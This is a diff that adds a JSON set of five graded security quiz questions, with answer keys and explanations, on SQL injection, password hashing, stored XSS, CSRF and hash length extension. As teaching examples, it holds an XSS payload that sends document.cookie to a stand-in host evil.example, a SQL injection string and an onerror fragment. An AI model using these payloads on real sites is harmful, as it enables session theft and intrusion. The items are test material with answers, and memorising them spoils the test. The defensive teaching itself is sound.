@@ -1,0 +1,98 @@
+[
+  {
+    "id": "sec-sql-injection-parameters",
+    "topic": "Security",
+    "difficulty": "Easy",
+    "points": 5,
+    "type": "single",
+    "question": "A search handler builds its query from user input:\n\n```python\ncur.execute(\"SELECT * FROM products WHERE name = '\" + name + \"'\")\n```\n\nWhich change reliably prevents SQL injection here?",
+    "options": [
+      "Pass the value as a query parameter, for example cur.execute(\"SELECT * FROM products WHERE name = %s\", (name,))",
+      "Replace every ' in name with '' before concatenating it",
+      "Validate the input with JavaScript in the browser before the form is submitted",
+      "Send the form with POST instead of GET, so the value doesn't appear in the URL"
+    ],
+    "answer": [
+      0
+    ],
+    "explanation": "With a parameterized query, the SQL text and the value are sent separately, so the value is never parsed as SQL, whatever characters it contains. (The placeholder syntax varies by driver: `%s`, `?`, `$1` or `:name`.)\n\nHand-rolled escaping is fragile. It depends on the database's quoting rules, the character encoding and settings such as backslash escapes: in MySQL's default mode, the input `\\' OR 1=1 -- ` becomes `\\'' OR 1=1 -- `, where the backslash escapes the first quote, the second one ends the string, and the rest runs as SQL. It's also easy to forget in one place. Validation in the browser is skipped by anyone who sends the request directly, and POST only moves the payload out of the URL."
+  },
+  {
+    "id": "sec-password-storage",
+    "topic": "Security",
+    "difficulty": "Easy",
+    "points": 5,
+    "type": "single",
+    "question": "How should a web application store user passwords so that it can check logins?",
+    "options": [
+      "Encrypt them with AES and keep the key in the application's configuration",
+      "Hash them with unsalted SHA-256",
+      "Hash them with a slow, salted password-hashing function such as Argon2id, bcrypt or scrypt",
+      "Base64-encode them so they aren't stored as plain text"
+    ],
+    "answer": [
+      2
+    ],
+    "explanation": "The server never needs the original password back, only a way to check a guess, so a one-way hash is the right tool, not reversible encryption. With encryption, anyone who gets the database and the key, which is often stored right next to it, gets every password.\n\nA unique salt per user makes identical passwords hash to different values and defeats precomputed rainbow tables. A deliberately slow (and, for Argon2id and scrypt, memory-hard) function makes each guess expensive. Plain SHA-256 is designed to be fast, so GPUs can try billions of guesses per second against a leaked hash. Base64 is an encoding, not protection: anyone can decode it."
+  },
+  {
+    "id": "sec-stored-xss-defenses",
+    "topic": "Security",
+    "difficulty": "Medium",
+    "points": 10,
+    "type": "multiple",
+    "question": "Users can post comments that other visitors see. An attacker posts:\n\n```html\n<script>fetch('https://evil.example/?c=' + document.cookie)</script>\n```\n\nWhich measures stop that script from running in other visitors' browsers? Select all that apply.",
+    "options": [
+      "HTML-escape the comment when rendering it into the page (< becomes &lt;, and so on)",
+      "Insert the comment into the DOM with element.textContent instead of innerHTML",
+      "Save comments to the database with parameterized SQL queries",
+      "Mark the session cookie HttpOnly",
+      "Send a Content-Security-Policy that disallows inline scripts (no 'unsafe-inline')",
+      "Serve the whole site over HTTPS"
+    ],
+    "answer": [
+      0,
+      1,
+      4
+    ],
+    "explanation": "Output encoding and `textContent` both make the browser treat the comment as text, so the tags are displayed instead of executed. (A `<script>` element added through `innerHTML` happens not to run, but a payload like `<img src=x onerror=...>` does, so `innerHTML` is still unsafe.) A Content-Security-Policy without `'unsafe-inline'` tells the browser to refuse inline scripts even if one gets into the page, which makes it a strong second line of defense.\n\nParameterized queries stop SQL injection, but the stored comment is still dangerous when it's rendered. `HttpOnly` stops `document.cookie` from reading the session cookie, which limits the damage, but the script still runs and can act as the user. HTTPS protects data in transit and does nothing about content the site itself serves."
+  },
+  {
+    "id": "sec-csrf-defenses",
+    "topic": "Security",
+    "difficulty": "Medium",
+    "points": 10,
+    "type": "multiple",
+    "question": "A banking site authenticates requests with a session cookie. An attacker's page contains a hidden form that automatically submits `POST https://bank.example/transfer` with the attacker's account number when a logged-in customer visits it. Which defenses stop this cross-site request forgery? Select all that apply.",
+    "options": [
+      "Put an unpredictable CSRF token, tied to the user's session, in every state-changing form and verify it on the server",
+      "Set the session cookie with SameSite=Lax or SameSite=Strict",
+      "Accept transfers only via POST, never via GET",
+      "Mark the session cookie HttpOnly and Secure",
+      "Check on the server that the request carries a valid session cookie"
+    ],
+    "answer": [
+      0,
+      1
+    ],
+    "explanation": "CSRF works because the browser attaches bank.example's cookie to every request sent to bank.example, whichever site started it. The attacker's page can't read the bank's pages (the same-origin policy prevents that), so a forged form can't include a valid CSRF token. `SameSite=Lax` or `Strict` tells the browser not to send the cookie on a cross-site POST at all.\n\nThe attack already uses POST, so restricting the method changes nothing. `HttpOnly` and `Secure` control script access to the cookie and the transport it travels over, not whether it is sent. And checking for a valid session cookie is exactly what the attacker relies on: the browser sends one."
+  },
+  {
+    "id": "sec-hash-length-extension",
+    "topic": "Security",
+    "difficulty": "Hard",
+    "points": 15,
+    "type": "single",
+    "question": "A webhook sender signs each request body as `sig = hex(SHA-256(secret + body))`, where `secret` is a shared key and `+` means concatenation. The receiver recomputes the value and compares. What is the main weakness of this scheme?",
+    "options": [
+      "SHA-256 can be reversed, so anyone who sees a signature can recover the secret",
+      "Given one valid (body, sig) pair, an attacker can compute a valid signature for body + padding + extra data without knowing the secret (a length-extension attack); use HMAC-SHA-256 instead",
+      "SHA-256 collisions are cheap to find, so an attacker can craft a different body with the same signature",
+      "There is no weakness, as long as the secret is long and random"
+    ],
+    "answer": [
+      1
+    ],
+    "explanation": "SHA-256 is a Merkle–Damgård hash: its output is the hash function's entire internal state after the last block. An attacker can load that state and keep hashing, which gives `SHA-256(secret + body + padding + extra)` for any `extra` they choose. They only need to know the secret's **length** (to compute the padding), and they can simply try each likely length.\n\nHMAC nests two keyed hashes, `H((k ⊕ opad) + H((k ⊕ ipad) + m))`, so this attack doesn't apply. SHA-3 and truncated variants like SHA-512/256 also resist length extension. SHA-256 is still preimage- and collision-resistant, so the reversal and collision options aren't practical, and a long secret doesn't help against length extension.\n\nThe receiver should also compare signatures in constant time (for example `hmac.compare_digest`) and reject old timestamps to stop replays."
+  }
+]
